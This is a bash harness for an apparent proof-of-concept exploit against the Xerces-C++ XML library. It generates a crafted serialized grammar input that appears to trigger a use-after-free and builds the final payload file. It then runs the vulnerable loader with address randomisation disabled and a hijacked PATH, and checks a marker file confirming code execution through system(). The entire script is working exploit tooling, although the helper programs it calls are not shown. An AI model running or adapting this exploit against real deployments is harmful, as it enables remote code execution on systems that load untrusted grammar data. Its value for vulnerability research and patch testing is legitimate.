#!/usr/bin/env bash
set -euo pipefail

: "${XERCES_BUILD:?set XERCES_BUILD to the Xerces-C++ build directory}"

export LD_LIBRARY_PATH="$XERCES_BUILD/src${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"

command_dir=/tmp/xerces-path
marker=/tmp/xerces_serialized_rce_proof
final_input=/tmp/xerces_final_input.bin

rm -f "$marker"
rm -f uaf3_grammar.bin final_input.bin "$final_input"
rm -rf "$command_dir"
mkdir -p "$command_dir"

./gen_uaf3 >/dev/null

# build the final input offline; the final run has no in-process helper
./build_final_input.py \
  uaf3_grammar.bin \
  ./poc_xerces_rce \
  "$final_input" \
  --command-dir "$command_dir" \
  --marker "$marker"

# clear the builder self-test marker, then run the plain loader with the same input path
rm -f "$marker"
set +e
PATH="$command_dir:$PATH" setarch "$(uname -m)" -R ./poc_xerces_rce "$final_input"
rc=$?
set -e

proof=$(cat "$marker" 2>/dev/null || true)

echo "rc=$rc"
echo "proof=$proof"

if [[ "$proof" == "xerces-stock-system-rce" ]]; then
  echo '[+] code execution proof hit through system()'
  exit 0
fi

echo '[-] proof did not hit'
exit 1
